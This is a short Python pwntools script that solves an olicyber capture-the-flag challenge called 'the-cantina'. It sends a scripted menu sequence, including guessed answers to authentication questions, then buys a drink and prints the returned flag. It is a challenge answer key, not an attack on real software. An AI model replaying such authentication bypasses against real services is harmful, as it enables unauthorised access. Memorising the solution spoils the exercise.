from pwn import *


with remote("the-cantina.challs.olicyber.it", 38083) as r:
    r.sendlineafter(b'> ', b'select_coin')
    r.sendline(b'OLI')
    r.sendlineafter(b'> ', b'select_wallet')
    r.sendline(b'0xBABE')
    r.sendlineafter(b'> ', b'authenticate')
    r.sendlineafter(b'?\n', b'Han')
    r.sendlineafter(b'?\n', b'Vader')
    r.sendlineafter(b'?\n', b'Kashyyyk')
    r.sendlineafter(b'> ', b'topup_wallet')
    r.sendlineafter(b'> ', b'list_drinks')
    r.sendlineafter(b'> ', b'buy_drink')
    r.sendline(b'Darksaber Distillate')
    flag = r.recvline().strip().decode().split(": ")[-1]
    print(f'Flag: {flag}')
